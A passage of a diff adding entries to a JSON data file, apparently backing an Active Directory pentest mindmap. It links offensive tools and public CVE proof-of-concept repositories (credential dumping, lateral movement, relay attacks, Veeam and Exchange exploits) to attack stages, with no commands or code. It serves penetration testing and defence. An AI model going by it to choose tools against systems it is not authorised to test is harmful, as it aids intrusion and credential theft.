+   "link": "https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.management/get-childitem",
+   "used_in": [
+    "low_access"
+   ]
+  },
+  "mshta.exe": {
+   "icon": "microsoft",
+   "link": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+   "used_in": [
+    "low_access"
+   ]
+  },
+  ".\\PrivescCheck.ps1": {
+   "icon": "ps1",
+   "link": "https://github.com/itm4n/PrivescCheck",
+   "used_in": [
+    "low_access"
+   ]
+  },
+  "findstr": {
+   "icon": "microsoft",
+   "link": "https://lolbas-project.github.io/lolbas/Binaries/Findstr/",
+   "used_in": [
+    "low_access",
+    "know_vuln_auth"
+   ]
+  },
+  "vssadmin": {
+   "icon": "microsoft",
+   "link": "https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin",
+   "used_in": [
+    "low_access"
+   ]
+  },
+  "policysecretunobfuscate.py": {
+   "icon": "github",
+   "link": "https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.py",
+   "used_in": [
+    "sccm"
+   ]
+  },
+  "PPLdump64.exe": {
+   "icon": "github",
+   "link": "https://github.com/itm4n/PPLdump",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "procdump.exe": {
+   "icon": "microsoft",
+   "link": "https://learn.microsoft.com/fr-fr/sysinternals/downloads/procdump",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "reg": {
+   "icon": "microsoft",
+   "link": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "lsassy": {
+   "icon": "github",
+   "link": "https://github.com/login-securite/lsassy",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "SharpDPAPI.exe": {
+   "icon": "github",
+   "link": "https://github.com/GhostPack/SharpDPAPI",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "DPAPImk2john.py": {
+   "icon": "github",
+   "link": "https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "irs.exe": {
+   "icon": "github",
+   "link": "https://github.com/zblurx/impersonate-rs",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "masky": {
+   "icon": "github",
+   "link": "https://github.com/Z4kSec/Masky/tree/master",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "psexec.exe": {
+   "icon": "microsoft",
+   "link": "https://learn.microsoft.com/fr-fr/sysinternals/downloads/psexec",
+   "used_in": [
+    "admin",
+    "lat_move"
+   ]
+  },
+  "tscon.exe": {
+   "icon": "microsoft",
+   "link": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "query": {
+   "icon": "microsoft",
+   "link": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query",
+   "used_in": [
+    "admin",
+    "sccm"
+   ]
+  },
+  "psexecsvc.py": {
+   "icon": "github",
+   "link": "https://github.com/sensepost/susinternals",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "Enter-PSSession": {
+   "icon": "ps1",
+   "link": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "xfreerdp": {
+   "icon": null,
+   "link": "https://linux.die.net/man/1/xfreerdp",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "smbclient-ng.py": {
+   "icon": "github",
+   "link": "https://github.com/p0dalirius/smbclient-ng",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "impacket": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "getnthash.py": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "passthecert.py": {
+   "icon": "github",
+   "link": "https://github.com/AlmondOffSec/PassTheCert",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "nltest.exe": {
+   "icon": "ps1",
+   "link": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)",
+   "used_in": [
+    "trusts"
+   ]
+  },
+  "Get-DomainTrust": {
+   "icon": "github",
+   "link": "https://github.com/PowerShellMafia/PowerSploit",
+   "used_in": [
+    "trusts"
+   ]
+  },
+  "Get-DomainTrustMapping": {
+   "icon": "github",
+   "link": "https://github.com/PowerShellMafia/PowerSploit",
+   "used_in": [
+    "trusts"
+   ]
+  },
+  "Get-DomainSID": {
+   "icon": "github",
+   "link": "https://github.com/PowerShellMafia/PowerSploit",
+   "used_in": [
+    "trusts"
+   ]
+  },
+  "Get-SQLServerLinkCrawl": {
+   "icon": "powerupsql",
+   "link": "https://github.com/NetSPI/PowerUpSQL",
+   "used_in": [
+    "trusts"
+   ]
+  },
+  "azuread_decrypt_msol_v2.ps1": {
+   "icon": "ps1",
+   "link": "https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "PowerShell": {
+   "icon": "ps1",
+   "link": null,
+   "used_in": [
+    "persistence"
+   ]
+  },
+  "Pcredz": {
+   "icon": "github",
+   "link": "https://github.com/lgandx/PCredz",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "OUned.py": {
+   "icon": "github",
+   "link": "https://github.com/synacktiv/OUned",
+   "used_in": [
+    "acl"
+   ]
+  },
+  "SCCMHound.exe": {
+   "icon": "github",
+   "link": "https://github.com/CrowdStrike/sccmhound",
+   "used_in": [
+    "sccm"
+   ]
+  },
+  "regsecrets.py": {
+   "icon": "github",
+   "link": "https://github.com/fortra/impacket/pull/1898",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "dpapidump.py": {
+   "icon": "github",
+   "link": "https://github.com/fortra/impacket/pull/1898",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "SOAPHound.exe": {
+   "icon": "soaphound",
+   "link": "https://github.com/FalconForceTeam/SOAPHound",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "certsync": {
+   "icon": "github",
+   "link": "https://github.com/zblurx/certsync",
+   "used_in": [
+    "dom_admin"
+   ]
+  },
+  "VeeamHax.exe": {
+   "icon": "github",
+   "link": "https://github.com/sfewer-r7/CVE-2023-27532",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "CVE-2023-27532": {
+   "icon": "github",
+   "link": "https://github.com/horizon3ai/CVE-2023-27532",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "CVE-2024-29849.py": {
+   "icon": "github",
+   "link": "https://github.com/sinsinology/CVE-2024-29849",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "CVE-2024-29855.py": {
+   "icon": "github",
+   "link": "https://github.com/sinsinology/CVE-2024-29855/",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "cve_2023_41320.py": {
+   "icon": "github",
+   "link": "https://github.com/Guilhem7/CVE_2023_41320",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "CVE-2024-40711.exe": {
+   "icon": "github",
+   "link": "https://github.com/watchtowrlabs/CVE-2024-40711",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "smbmap.py": {
+   "icon": "github",
+   "link": "https://github.com/ShawnDEvans/smbmap",
+   "used_in": [
+    "admin"
+   ]
+  },
+  "proxyshell_rce.py": {
+   "icon": "github",
+   "link": "https://github.com/dmaasland/proxyshell-poc",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "poc_aug3.py": {
+   "icon": "github",
+   "link": "https://github.com/testanull/ProxyNotShell-PoC/",
+   "used_in": [
+    "know_vuln_auth"
+   ]
+  },
+  "krbrelayx.py": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/krbrelayx",
+   "used_in": [
+    "mitm"
+   ]
+  },
+  "nuclei": {
+   "icon": "nuclei",
+   "link": "https://github.com/projectdiscovery/nuclei",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "Mayfly": {
+   "icon": "x",
+   "link": "https://x.com/M4yFly",
+   "used_in": []
+  },
+  "Viking": {
+   "icon": "x",
+   "link": "https://x.com/Vikingfr",
+   "used_in": []
+  },
+  "Sant0rryu": {
+   "icon": "x",
+   "link": "https://x.com/Sant0rryu",
+   "used_in": []
+  },
+  "Jenaye": {
+   "icon": "x",
+   "link": "https://x.com/jenaye_fr",
+   "used_in": []
+  },
+  "Daathk": {
+   "icon": "x",
+   "link": "https://x.com/Daahtk",
+   "used_in": []
+  },
+  "ocd-mindmaps": {
+   "icon": "github",
+   "link": "https://github.com/Orange-Cyberdefense/ocd-mindmaps",
+   "used_in": []
+  }
+ }
+}
